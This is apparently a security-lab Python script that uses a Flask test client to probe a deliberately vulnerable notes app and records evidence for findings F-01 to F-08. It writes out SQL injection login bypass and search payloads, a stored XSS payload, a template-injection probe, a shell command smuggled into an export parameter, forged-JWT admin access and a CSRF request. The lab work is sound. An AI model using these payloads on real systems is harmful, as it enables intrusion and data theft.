"""Harmless probes against the unmodified starter in an isolated temporary DB.
Run ONLY with .lab-venv/bin/python. No network listeners are created.
"""
import argparse
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import tempfile
from datetime import datetime, timezone

ROOT=Path(__file__).resolve().parents[1]
parser=argparse.ArgumentParser()
parser.add_argument('--output', default='evidence/baseline.json')
args=parser.parse_args()
output_path=(ROOT/args.output).resolve()
if not output_path.is_relative_to(ROOT/'evidence'):
    parser.error('--output must stay within evidence/')
team=json.loads((ROOT/'team.json').read_text())
os.environ['TEAM_ID']=team['id']
spec=importlib.util.spec_from_file_location('original',ROOT/'lab/original/app.py')
m=importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)
results=[]
def record(fid,title,request,response,assertion):
    assert assertion,title
    results.append({'finding':fid,'title':title,'request':request,'status':response.status_code,
                    'response_excerpt':response.get_data(as_text=True)[:1800]})
with tempfile.TemporaryDirectory(prefix='notevault-baseline-') as temp:
    m.DB=str(Path(temp)/'baseline.db');m.seed();m.app.config['TESTING']=True
    c=m.app.test_client()
    r=c.post('/login',data={'username':"admin' --",'password':'wrong'})
    record('F-01','SQL injection bypasses credential check','POST /login username=admin\' -- password=wrong',r,r.status_code==302 and 'session=' in r.headers.get('Set-Cookie',''))
    c=m.app.test_client();c.post('/login',data={'username':'alice','password':'alicepw'})
    r=c.get('/search',query_string={'q':"' OR 1=1 -- "})
    record('F-01','Search exposes another owner’s marker',"GET /search?q=' OR 1=1 -- ",r,team['id'] in r.get_data(as_text=True) and m.team_marker() in r.get_data(as_text=True))
    r=c.get('/api/notes/3')
    record('F-02','Alice reads the administrator build marker','GET /api/notes/3 as alice',r,r.json['owner']=='admin' and m.team_marker() in r.json['body'])
    c.post('/register',data={'username':'probe_user','password':'probe-pass','role':'admin'})
    c.post('/login',data={'username':'probe_user','password':'probe-pass'})
    r=c.get('/admin')
    record('F-03','Registration accepts an administrator role','POST /register role=admin; login; GET /admin',r,r.status_code==200)
    record('F-06','Admin endpoint exposes password digests','GET /admin after role escalation',r,any(x['password']==hashlib.md5(b'admin123').hexdigest() for x in r.json))
    c=m.app.test_client();c.post('/login',data={'username':'alice','password':'alicepw'})
    payload='<img src=x onerror=alert(1)>'
    c.post('/notes',data={'title':'XSS probe','body':payload})
    r=c.get('/')
    record('F-04','Stored content is inserted as executable HTML','POST /notes body=<img src=x onerror=alert(1)>; GET /',r,payload in r.get_data(as_text=True))
    c.post('/notes',data={'title':'Template probe','body':'{{7*7}}'})
    r=c.get('/search',query_string={'q':'7*7'})
    record('F-04','Stored template expression executes in search',"POST /notes body={{7*7}}; GET /search?q=7*7",r,'Template probe: 49' in r.get_data(as_text=True))
    r=c.get('/export',query_string={'fmt':'txt; printf NV_SAFE_PROBE'})
    record('F-05','Export invokes a shell command','GET /export?fmt=txt; printf NV_SAFE_PROBE',r,'NV_SAFE_PROBE' in r.get_data(as_text=True))
    token=m.jwt.encode({'sub':'admin'},m.SECRET,algorithm='HS256').decode()
    c.set_cookie('localhost','session',token)
    r=c.get('/admin')
    record('F-07','Known source secret allows administrator session forgery','Locally sign sub=admin with source SECRET; GET /admin',r,r.status_code==200)
    c=m.app.test_client();login=c.post('/login',data={'username':'alice','password':'alicepw'})
    r=c.post('/notes',data={'title':'No CSRF token','body':'Cross-origin test'},headers={'Origin':'https://attacker.invalid'})
    record('F-08','Authenticated state change accepts foreign origin without token','POST /notes with Origin: https://attacker.invalid, authenticated cookie, no CSRF token',r,r.status_code==302)
    results.append({'finding':'F-08','cookie_attributes':login.headers.get('Set-Cookie'),'scope':'Server-side cross-origin acceptance demonstrated; browser exploitability depends on browser cookie defaults.'})
output={'team':team['id'],'marker':m.team_marker(),'captured_at':datetime.now(timezone.utc).isoformat(),
        'baseline_sha256':hashlib.sha256((ROOT/'lab/original/app.py').read_bytes()).hexdigest(),
        'method':'Flask test client on a fresh temporary DB; no public listener; harmless output probes',
        'limitations':'XSS injection and SSTI expression evaluation proven server-side; no browser script execution screenshot in this evidence.',
        'results':results}
(ROOT/'evidence').mkdir(exist_ok=True)
output_path.parent.mkdir(parents=True,exist_ok=True)
output_path.write_text(json.dumps(output,indent=2))
print(json.dumps({'team':output['team'],'marker':output['marker'],'probes_passed':len(results)-1,'evidence':str(output_path.relative_to(ROOT))},indent=2))
